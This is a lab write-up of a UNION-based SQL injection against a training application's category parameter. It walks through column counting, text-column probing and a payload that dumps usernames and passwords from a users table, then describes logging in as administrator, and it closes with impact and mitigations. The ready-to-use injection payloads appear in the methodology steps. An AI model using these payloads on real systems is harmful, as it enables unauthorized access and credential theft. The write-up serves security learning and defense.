# SQL Injection UNION Attack: Retrieving Data from Other Tables

## Overview

This lab demonstrates how a UNION-based SQL Injection vulnerability can be used to retrieve sensitive information from other tables within the database. After identifying the number of columns returned by the original query and determining which columns could display text values, it became possible to extract usernames and passwords from the users table.

## Objective

Retrieve usernames and passwords from another table in the database and use the administrator credentials to log in.

## Vulnerability

The application was vulnerable to SQL Injection through the category parameter.

**Vulnerable Parameter:**

```http
/category?category=Accessories
```

The application incorporated user-controlled input directly into an SQL query without proper sanitization.

## Methodology

### Step 1: Determine the Number of Columns

The number of columns returned by the query was identified using ORDER BY testing.

Payloads:

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```

### Observation

- ORDER BY 1 executed successfully.
- ORDER BY 2 executed successfully.
- ORDER BY 3 generated an SQL error.

### Conclusion

The query returned two columns.

### Step 2: Identify Columns That Accept Text

Payload:

```sql
' UNION SELECT 'hello',NULL-- -
```

### Observation

The value **hello** appeared in the application's response.

### Conclusion

The first column accepted and displayed text values.

The second column was tested using:

```sql
' UNION SELECT NULL,'hello'-- -
```

The value **hello** also appeared in the response.

### Conclusion

Both columns accepted and displayed text values.

### Step 3: Retrieve User Credentials

The lab provided the following database information:

**Table Name:**

```text
users
```

**Columns:**

```text
username
password
```

Payload:

```sql
' UNION SELECT username,password FROM users-- -
```

### Observation

The application displayed multiple username and password pairs, including the administrator account credentials.

### Step 4: Log In as Administrator

The extracted administrator username and password were used to authenticate to the application.

## Result

Successfully retrieved user credentials from the database and logged in as the administrator.

## Why It Worked

The application directly incorporated user-controlled input into an SQL query without proper validation. Since the number of columns had already been determined and both columns accepted text values, a UNION SELECT statement could be used to combine the original query with data retrieved from another table. Because the users table and its column names were known, sensitive credentials could be extracted directly.

## Impact

An attacker may be able to:

- Retrieve usernames and passwords
- Access sensitive database records
- Compromise administrator accounts
- Gain unauthorized access to application functionality
- Escalate privileges within the application

## Mitigation

- Use parameterized queries (prepared statements)
- Avoid constructing SQL queries using user input
- Validate and sanitize all user input
- Restrict database account privileges
- Implement secure error handling
- Conduct regular security testing

## Key Concepts Learned

- UNION-Based SQL Injection
- Column Count Discovery
- Text Column Identification
- Data Extraction from Other Tables
- Credential Disclosure
- Administrator Account Compromise

## Tools Used

- Burp Suite Repeater
- Browser Developer Tools

## Conclusion

This lab demonstrated the complete UNION-based SQL Injection workflow. By determining the correct number of columns, identifying which columns accepted text values, and leveraging a UNION SELECT statement, it was possible to retrieve usernames and passwords from another database table. The extracted administrator credentials were then used to gain unauthorized access to the application.
